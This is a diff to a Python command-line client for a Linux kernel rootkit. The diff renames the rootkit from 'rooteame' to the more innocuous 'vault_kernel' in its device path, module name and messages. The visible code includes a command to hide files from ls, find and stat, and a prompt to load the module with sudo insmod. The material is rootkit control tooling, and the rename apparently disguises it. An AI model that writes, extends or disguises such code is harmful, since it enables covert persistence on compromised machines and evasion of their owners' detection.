@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 """
-rooteame CLI — Userspace client for the rooteame kernel rootkit
+vault_kernel CLI — Userspace client for the vault_kernel kernel rootkit
 ruby570bocadito © 2026
 
 Usage:
-    python3 rooteame_cli.py <command> [args...]
+    python3 vault_kernel_cli.py <command> [args...]
 
 Commands:
     hide-file <name>      Hide a file/directory from ls, find, stat
@@ -32,7 +32,7 @@ import ctypes
 import argparse
 
 MAGIC = 0xC0
-DEVICE_PATH = "/dev/rooteame"
+DEVICE_PATH = "/dev/vault_kernel"
 
 # Standard Linux ioctl layout (uapi/asm-generic/ioctl.h):
 #   bits 31:30 = direction  (0=none, 1=write, 2=read)
@@ -231,11 +231,11 @@ class RooteameClient:
     def status(self):
         """Check if rootkit is loaded."""
         if os.path.exists(DEVICE_PATH):
-            print(f"[*] rooteame kernel module is LOADED")
+            print(f"[*] vault_kernel kernel module is LOADED")
             print(f"    Device: {DEVICE_PATH}")
             try:
                 import subprocess
-                result = subprocess.run(['modinfo', 'rooteame'],
+                result = subprocess.run(['modinfo', 'vault_kernel'],
                                         capture_output=True, text=True)
                 if result.returncode == 0:
                     for line in result.stdout.splitlines():
@@ -245,13 +245,13 @@ class RooteameClient:
             except Exception:
                 pass
         else:
-            print("[*] rooteame kernel module is NOT loaded")
-            print(f"    Run: sudo insmod rooteame.ko")
+            print("[*] vault_kernel kernel module is NOT loaded")
+            print(f"    Run: sudo insmod vault_kernel.ko")
 
 
 def main():
     parser = argparse.ArgumentParser(
-        description="rooteame CLI — kernel rootkit control",
+        description="vault_kernel CLI — kernel rootkit control",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog=__doc__
     )
